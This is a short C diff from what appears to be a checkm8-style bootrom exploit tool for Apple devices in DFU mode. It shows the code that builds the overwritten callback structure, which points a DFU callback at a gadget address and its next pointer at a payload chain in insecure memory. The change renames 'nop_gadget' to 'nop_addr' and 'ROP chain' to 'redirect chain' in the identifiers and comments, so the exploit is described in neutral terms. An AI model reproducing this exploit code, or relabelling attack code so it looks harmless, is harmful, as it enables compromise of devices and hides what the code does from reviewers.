@@ -209,7 +209,7 @@ static void dfu_getstatus_quick(libusb_device_handle *usb)
  * build_overwrite_64 -- Build a 64-bit DFU callback structure.
  *
  * For chips without tlbi: callback = insecure_memory_base.
- * For chips with tlbi (newer): callback = nop_gadget,
+ * For chips with tlbi (newer): callback = nop_addr,
  *   next = insecure_memory_base.
  */
 static void build_overwrite_64(checkm8_overwrite_t *ow,
@@ -218,16 +218,16 @@ static void build_overwrite_64(checkm8_overwrite_t *ow,
     memset(ow, 0, sizeof(*ow));
 
     if (CPID_HAS_TLBI(chip)) {
-        /* Newer path: callback -> nop_gadget, next -> start of ROP chain
-         * in the payload.  The ROP chain is written at
+        /* Newer path: callback -> nop_addr, next -> start of redirect chain
+         * in the payload.  The redirect chain is written at
          * insecure_memory_base + offsetof(dfu_callback_t, callback)
          * by usb_rop_callbacks().  iBoot processes this as a linked list
          * of callback structs; the first entry is at base + 0x20. */
-        ow->callback.callback = chip->nop_gadget;
+        ow->callback.callback = chip->nop_addr;
         ow->callback.next     = chip->insecure_memory_base
                                     + offsetof(dfu_callback_t, callback);
         log_debug("build_overwrite_64: callback=0x%llX (nop), "
-                  "next=0x%llX (rop_chain)",
+                  "next=0x%llX (redirect_chain)",
                   (unsigned long long)ow->callback.callback,
                   (unsigned long long)ow->callback.next);
     } else {
